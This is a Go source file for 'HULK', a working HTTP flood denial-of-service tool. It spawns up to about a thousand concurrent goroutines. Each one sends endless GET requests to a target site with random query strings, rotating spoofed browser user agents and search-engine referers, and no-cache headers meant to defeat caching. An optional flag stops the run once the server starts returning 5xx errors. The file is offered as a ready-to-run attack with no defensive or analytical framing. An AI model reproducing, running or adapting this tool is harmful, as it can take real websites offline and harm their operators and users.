package main

import (
	"os"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"math/rand"
	"os/signal"
	"syscall"
	"strings"
	"strconv"
	"time"
	"runtime"
)

const ACCEPT_CHARSET = "windows-1251,utf-8;q=0.7,*;q=0.7"
const (
	STARTED = iota
	EXIT_OK
	EXIT_ERR
	COMPLETE
)

// global params
var request_counter int = 0
var safe bool = false
var headers_referers []string = []string{
	"http://www.google.com/?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://engadget.search.aol.com/search?q=",
    "http://www.google.ru/?hl=ru&q=",
    "http://yandex.ru/yandsearch?text=",
}
var headers_useragents []string = []string{
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
}


func main() {
	var safe bool
	var site string

	flag.BoolVar(&safe, "safe", false, "Autoshut after dos.")
	flag.StringVar(&site, "site", "http://localhost", "Destination site.")
	flag.Parse()
	
	t := os.Getenv("HULKMAXPROC")
	maxproc, e := strconv.Atoi(t)
	if e != nil {
		maxproc = 1024
	}

	u, e := url.Parse(site)
	if e != nil {
		fmt.Println("Error parsing url parameter.")
		os.Exit(1)
	}

	go func() {
		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
		ss := make(chan int, 64) // start/stop flag
		cur, err := 0, 0
		fmt.Println("Cur req |\tErr req |\tSent req |\tGen state |\tGoroutines")
		for {
			go httpcall(site, u.Host, ss)
			if (cur + err) % 20 == 0 {
				fmt.Printf("\r%7d |\t%7d |\t%8d |\tsending   |\t%7d", cur, err, cur+err, runtime.NumGoroutine())
			}
			switch <-ss {
			case STARTED:
				cur++
				if cur > maxproc {
					fmt.Printf("\r%7d |\t%7d |\t%8d |\tsleeping  |\t%7d", cur, err, cur+err, runtime.NumGoroutine())
					time.Sleep(12 * time.Second)
					runtime.GC()
				}
			case EXIT_ERR:
				err++
				cur--
/*				if (cur + err) / err > 4 {
					runtime.GC()
				}*/
			case EXIT_OK:
				cur--		
			case COMPLETE:
				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
				os.Exit(0)
			}
		}
	}()

	ctlc := make(chan os.Signal)
	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
	<-ctlc
	fmt.Println("\r-- Interrupted by user --        \n\n\r")
}

func httpcall(url string, host string, s chan int) {
	var param_joiner string
	var client = new(http.Client)

	s<-STARTED
	if strings.ContainsRune(url, '?') {
		param_joiner = "&"
	} else {
		param_joiner = "?"
	}

Reuse:
	q, e := http.NewRequest("GET", url + param_joiner + buildblock(rand.Intn(7) + 3) + "=" + buildblock(rand.Intn(7) + 3), nil)
	if e != nil {
		s<-EXIT_ERR
		return
	}
	q.Header.Set("User-Agent", headers_useragents[rand.Intn(len(headers_useragents))])
  q.Header.Add("Cache-Control", "no-cache")
  q.Header.Add("Accept-Charset", ACCEPT_CHARSET)
  q.Header.Set("Referer", headers_referers[rand.Intn(len(headers_referers))] + buildblock(rand.Intn(5) + 5))
  q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
  q.Header.Add("Connection", "keep-alive")
  q.Header.Add("Host", host)	
	r, e := client.Do(q)	
	if e != nil {
		s<-EXIT_ERR
		return
	}
	r.Body.Close()
	if safe && (r.StatusCode == 500 || r.StatusCode == 501 || r.StatusCode == 502 || r.StatusCode == 503 || r.StatusCode == 504) {
		s<-COMPLETE
	} else {
		time.Sleep(144 * time.Millisecond)
		goto Reuse
	}
}

func buildblock(size int)(s string) {
	var a []rune
	for i := 0; i < size; i++ {
        a = append(a, rune(rand.Intn(25) + 65))
	}
	return string(a)
}